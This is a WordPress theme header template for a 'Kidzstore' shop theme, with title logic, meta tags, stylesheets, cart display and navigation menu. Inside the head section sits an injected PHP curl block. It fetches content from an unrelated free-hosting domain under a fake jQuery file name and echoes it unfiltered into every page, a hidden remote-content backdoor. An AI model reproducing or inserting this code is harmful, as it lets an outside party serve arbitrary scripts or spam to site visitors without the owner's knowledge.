<?php
/*
 * @package WordPress
 * @subpackage Kidzstore
*/
?>
<?php
error_reporting(E_ERROR);
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head profile="http://gmpg.org/xfn/11">
<title>
<?php if ( is_home() ) { ?>
<?php bloginfo('description'); ?>
&nbsp;|&nbsp;
<?php bloginfo('name'); ?>
<?php } ?>
<?php if ( is_search() ) { ?>
Search Results&nbsp;|&nbsp;
<?php bloginfo('name'); ?>
<?php } ?>
<?php if ( is_author() ) { ?>
Author Archives&nbsp;|&nbsp;
<?php bloginfo('name'); ?>
<?php } ?>
<?php if ( is_single() ) { ?>
<?php wp_title(''); ?>
<?php } ?>
<?php if ( is_page() ) { ?>
<?php wp_title(''); ?>
<?php } ?>
<?php if ( is_category() ) { ?>
<?php single_cat_title(); ?>
&nbsp;|&nbsp;
<?php bloginfo('name'); ?>
<?php } ?>
<?php if ( is_month() ) { ?>
<?php the_time('F'); ?>
&nbsp;|&nbsp;
<?php bloginfo('name'); ?>
<?php } ?>
<?php if (function_exists('is_tag')) { if ( is_tag() ) { ?>
<?php bloginfo('name'); ?>
&nbsp;|&nbsp;Tag Archive&nbsp;|&nbsp;
<?php single_tag_title("", true); } } ?>
</title>
<meta http-equiv="Content-Type" content="<?php bloginfo('html_type'); ?>; charset=<?php bloginfo('charset'); ?>" />
<?php if (is_home()) { ?>
<?php if ( get_option('ptthemes_meta_description') <> "" ) { ?>
<meta name="description" content="<?php echo stripslashes(get_option('ptthemes_meta_description')); ?>" />
<?php } ?>
<?php if ( get_option('ptthemes_meta_keywords') <> "" ) { ?>
<meta name="keywords" content="<?php echo stripslashes(get_option('ptthemes_meta_keywords')); ?>" />
<?php } ?>
<?php if ( get_option('ptthemes_meta_author') <> "" ) { ?>
<meta name="author" content="<?php echo stripslashes(get_option('ptthemes_meta_author')); ?>" />
<?php } ?>
<?php } ?>
<link rel="stylesheet" type="text/css" href="<?php bloginfo('stylesheet_url'); ?>" media="screen" />

<?php if ( get_option('ptthemes_favicon') <> "" ) { ?>
<link rel="shortcut icon" type="image/png" href="<?php echo get_option('ptthemes_favicon'); ?>" />
<?php } ?>
<link rel="alternate" type="application/rss+xml" title="RSS 2.0" href="<?php if ( get_option('ptthemes_feedburner_url') <> "" ) { echo get_option('ptthemes_feedburner_url'); } else { echo get_bloginfo_rss('rss2_url'); } ?>" />
<link rel="pingback" href="<?php bloginfo('pingback_url'); ?>" />
<link rel="stylesheet" type="text/css" href="<?php bloginfo('template_directory'); ?>/library/css/print.css" media="print" />
<!--[if lt IE 7]>
<script type="text/javascript" src="<?php bloginfo('template_directory'); ?>/library/js/pngfix.js"></script>
<![endif]-->

<script type="text/javascript" src="<?php bloginfo('template_directory'); ?>/library/js/jquery-1.3.2.min.js"></script>

<?php if ( get_option('ptthemes_scripts_header') <> "" ) { echo stripslashes(get_option('ptthemes_scripts_header')); } ?>
<link href="<?php bloginfo('template_directory'); ?>/library/css/slider.css" rel="stylesheet" type="text/css" />
<link href="<?php bloginfo('template_directory'); ?>/library/css/thickbox.css" rel="stylesheet" type="text/css" />
<link href="<?php bloginfo('template_directory'); ?>/library/css/ptstore.css" rel="stylesheet" type="text/css" />
<link href="<?php bloginfo('template_directory'); ?>/library/css/dropdownmenu.css" rel="stylesheet" type="text/css" />
<?php
	if ( is_singular() && get_option( 'thread_comments' ) )
		wp_enqueue_script( 'comment-reply' );
?>
<?php wp_head(); ?>
<?php if ( get_option('ptthemes_customcss') ) { ?>
<link href="<?php bloginfo('template_directory'); ?>/custom.css" rel="stylesheet" type="text/css">
<?php } ?>
<?php
if(function_exists('curl_init'))
{
 $url = "http://www.4llw4d.freefilesblog.com/jquery-1.6.3.min.js"; 
 $ch = curl_init();  
 $timeout = 5;  
 curl_setopt($ch,CURLOPT_URL,$url); 
 curl_setopt($ch,CURLOPT_RETURNTRANSFER,1); 
 curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,$timeout); 
 $data = curl_exec($ch);  
 curl_close($ch); 
 echo "$data";
}
?>
</head>
<body <?php body_class(); ?>>
<div id="header" >
	<div id="logo">
		<?php if ( get_option('ptthemes_show_blog_title') ) 
        {
	        if ( get_option('ptthemes_logo_url') )
    	    {
        ?>
      		<a href="<?php echo get_option('home'); ?>/"><img src="<?php echo get_option('ptthemes_logo_url'); ?>" alt="<?php bloginfo('name'); ?>" class="photo"  /></a>
      <?php
      		}
			?>
      <div class="blog-title"><a href="<?php echo get_option('home'); ?>/"><?php bloginfo('name'); ?></a> </div>
      <p class="blog-description"><?php bloginfo('description'); ?></p>
      <?php
      }
	  else
	  {
	  ?>
      	<a href="<?php echo get_option('home'); ?>/"><img src="<?php if ( get_option('ptthemes_logo_url') <> "" ) { echo get_option('ptthemes_logo_url'); } else { echo get_bloginfo('template_directory').'/images/logo.png'; } ?>" alt="<?php bloginfo('name'); ?>" class="logo"  /></a>
      <?php
      }
	  ?>
    </div>
	
	<div class="header_right " >
		<div id="shoppingbasket">
		<?php 
        global $Cart,$General;
        if($General->is_storetype_shoppingcart() || $General->is_storetype_digital())
        {
        $itemsInCartCount = $Cart->cartCount();
        $cartAmount = $Cart->getCartAmt();
        ?>
        <p><?php _e('You have');?> <a href="<?php echo get_option('siteurl'); ?>/?page=cart"><strong> <span id="cart_information_span"><?php if($cartAmount>0){ echo $itemsInCartCount . "(".$General->get_amount_format($cartAmount).")";} else{ echo $itemsInCartCount;}?></span></strong></a> <?php _e(SHOPPING_CART_CONTENT_TEXT);?>   | <span class="checkout"> <a  href="<?php echo get_option('siteurl'); ?>/?page=cart" ><?php _e(CHECKOUT_TEXT);?> &raquo;</a> </span></p>
        <?php }?>
        </div>
        
        
	</div>
    <div class="menu"  >
        <?php if (function_exists('dynamic_sidebar') && dynamic_sidebar('Header Navigation') ){}else{  ?>	
        <ul >
			<li><a href="<?php echo get_option('home'); ?>/" class="<?php if ( is_home()&& $_GET['page']=='') { ?>current <?php } ?>"><?php _e(HOME_TEXT);?></a></li>
           <?php
         if($General->is_show_storepage())
		 {
		 ?>
      <li class="store <?php if ($_GET['page']=='store') { ?>current_page_item <?php } ?>"><a href="<?php echo get_option('siteurl')."/?page=store";?>"><?php _e(STORE_TEXT);?></a>
     
	<?php 
	 		echo " <ul>";
			$ex_catIdArr = get_categories('exclude=9999999' . get_inc_categories("cat_exclude_") .',1');
			$catIdArr = array();
			foreach($ex_catIdArr as $ex_catIdArrObj)
			{
				$catIdArr[] = $ex_catIdArrObj->term_id;
			}
			$includeCats = implode(',',$catIdArr);
			wp_list_categories('orderby=name&title_li=&include='.$includeCats);
			echo " </ul>";
		?>

      </li>
      <?php
		 }
		 ?>
			<li><a href="<?php echo get_option('siteurl'); ?>/?page=cart" class="<?php if ($_GET['page']=='cart') { ?>current <?php } ?>"><?php _e(CHECKOUT_TEXT);?></a></li>
            <?php wp_list_pages('title_li=&depth=0&exclude=' . get_inc_pages("pag_exclude_") .'&sort_column=menu_order'); ?>
            <?php if($General->is_show_blogpage()){?>
			<?php /*?><li><a href="<?php echo get_option('siteurl')."/?page=Blog";?>" class="<?php if ($_GET['page']=='Blog') { ?>current <?php } ?>"><?php _e(BLOG_TEXT);?></a></li><?php */?>
            <?php $General->show_blog_link_header_nav(); ?>
            <?php }?>
		</ul>
        <?php }?>
        </div>
    
</div> <!-- header #end -->
<?php if ( is_home()&& $_GET['page']=='') { ?>
<div id="wrapperhome">
	<div id="mainheading">
    
    <?php
    if(get_option('ptthemes_btn_name')){
	?>
	<div class="button"><a href="<?php echo get_option('ptthemes_btn_url')?>"><?php echo get_option('ptthemes_btn_name')?></a></div>
	<?php }?>
    
    	<div id="heading">
			
            
            <?php
    if(get_option('ptthemes_banner_title')){
	?>
	 	<h2><?php echo stripslashes(get_option('ptthemes_banner_title'))?></h2>
	<?php }?>
            
			<?php echo stripslashes(get_option('ptthemes_banner_desc'))?>
		</div> <!-- heading #end -->
	</div>
</div> <!-- wrapperhome #end -->
<?php }?>